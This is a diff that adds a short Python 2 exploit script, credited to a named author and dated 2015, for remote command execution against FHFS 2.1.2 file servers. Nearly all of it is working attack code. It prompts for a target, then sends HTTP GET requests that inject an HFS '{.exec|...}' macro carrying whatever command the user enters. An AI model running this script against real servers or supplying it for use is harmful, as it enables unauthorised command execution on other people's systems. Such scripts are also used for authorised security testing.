@@ -1,0 +1,35 @@
+#!/usr/bin/python
+#
+# FHFS - FTP/HTTP File Server 2.1.2 Remote Command Execution
+#
+# Author: Naser Farhadi
+#
+# Date: 26 August 2015 # Version: 2.1.2 # Tested on: Windows 7 SP1 (32 bit)
+#
+# Link : http://sourceforge.net/projects/fhfs/
+#
+# Description : FHFS is a FTP and HTTP Web Server package,
+#               transparently based on HFS and FileZilla. FHFS is built to act as an all-in-one user-based file hosting website,
+#               good for schools, businesses, etc. whose students/employees need to easily transport files. 
+# Usage:
+#       chmod +x FHFS.py
+#       ./FHFS.py
+#
+# Video: http://youtu.be/ch5A2bQEB0I
+##
+
+import socket
+
+url = raw_input("Enter URL : ")
+try:
+      while True:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.connect((url, 80))
+            cmd = raw_input("Enter command (E.g. calc) or press Ctrl+C to exit : ")
+            req = "GET /?{.exec|"+cmd+".}"
+            req += " HTTP/1.1\r\n\r\n"
+            sock.send(req)
+            sock.close()
+            print "Done!"
+except KeyboardInterrupt:
+      print "Bye!"
